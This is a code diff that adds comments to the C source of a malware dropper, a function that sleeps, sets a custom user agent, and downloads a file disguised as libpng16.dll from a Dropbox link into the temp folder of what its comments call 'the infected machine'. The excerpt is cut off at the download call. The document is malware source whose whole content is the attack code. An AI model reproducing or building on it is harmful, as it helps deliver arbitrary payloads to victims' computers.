@@ -1,5 +1,7 @@
 #include "Dropper.h"
 
+//Dropper that drops anything we want to drop to the infected machine
+//using the URLDownloadToFileW function.
 void Dropper(void) {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -7,11 +9,17 @@ void Dropper(void) {
 	WCHAR temppath[262];
 	WCHAR filepath[264];
 	Sleep(60000);
+	//get the temp path
 	GetTempPathW(0x104, temppath);
+	//combine the temp path with the file name
 	PathCombineW(filepath, temppath, (LPCWSTR)u"libpng16.dll");
 	memset(&si, 0, 0x68);
 	si.cb = 0x68;
+	
+	//Delete the file from the cache
 	//DeleteUrlCacheEntryW(L"https://www.dropbox.com/s/yfyl763sy2guhkl/libpng16.dll?dl=1");
+
+	//This declearation is used to change the user agent to something else
 	UrlMkSetSessionOption(URLMON_OPTION_USERAGENT, (LPVOID)"ch0nky", 7, 0);
 	if (URLDownloadToFileW(0,
 		L"https://www.dropbox.com/s/yfyl763sy2guhkl/libpng16.dll?dl=1", filepath, 0
